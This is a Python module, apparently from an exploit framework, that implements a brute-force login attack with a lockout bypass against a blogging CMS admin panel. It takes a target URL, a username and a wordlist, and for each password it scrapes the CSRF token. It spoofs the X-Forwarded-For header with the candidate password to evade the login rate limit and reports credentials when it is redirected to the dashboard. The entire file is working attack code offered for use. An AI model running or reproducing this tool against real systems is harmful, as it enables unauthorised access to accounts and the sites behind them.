from .internal.base import Exploit

class BlueditMitigationBypass(Exploit):
    def __init__(self):
        super().__init__()
        self.prompt = "(BlueditLoginMitigationBypass) ‚ùØ "

        self.pip_dependencies = [
            "requests"
        ]

        self.info["Credits to"] = "https://github.com/rastating"
        self.args = {
            "url":
                { "description": "the vulnerable target url, ex. http://10.10.10.10",
                  "required": True },
            "username":
                { "description": "username to attempt to login as",
                  "required": True },
            "wordlist":
                { "description": "wordlist to use for brute forcing login",
                  "required": True }
        }

        for arg in self.args.keys():
            self.__dict__[arg] = "N/a" 

    def run(self):
        from re import search
        from requests import Session
        from os.path import isfile
        if "http" in self.url:
            login_url = self.url + '/admin/login'
        else:
            print(f"must specify HTTP protocol for ``url`` argument")
            print("example:\n\thttp://10.10.10.10")
            return

        if isfile(self.wordlist):
            try:
                for password in open(self.wordlist, 'r'):
                        password = password.strip()
                        session = Session()
                        login_page = session.get(login_url)
                        csrf_token = search(
                            'input.+?name="tokenCSRF".+?value="(.+?)"',
                            login_page.text
                        ).group(1)

                        print(f'\033[31m[*]\033[0m Trying: {password}')

                        headers = {
                                'X-Forwarded-For': password,
                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
                                'Referer': login_url
                        }

                        data = {
                                'tokenCSRF': csrf_token,
                                'username': self.username,
                                'password': password,
                                'save': ''
                        }

                        login_result = session.post(
                                login_url,
                                headers=headers,
                                data=data,
                                allow_redirects=False)

                        if 'location' in login_result.headers:
                            if '/admin/dashboard' in login_result.headers['location']:
                                print('\n[SUCCESS]::password found!')
                                print(f'Use the credentials ""{self.username}:{password}"" to login.')
                                break
            except KeyboardInterrupt:
                print("[EXCEPTION]::caught `KeyboardInterrupt`")
                return
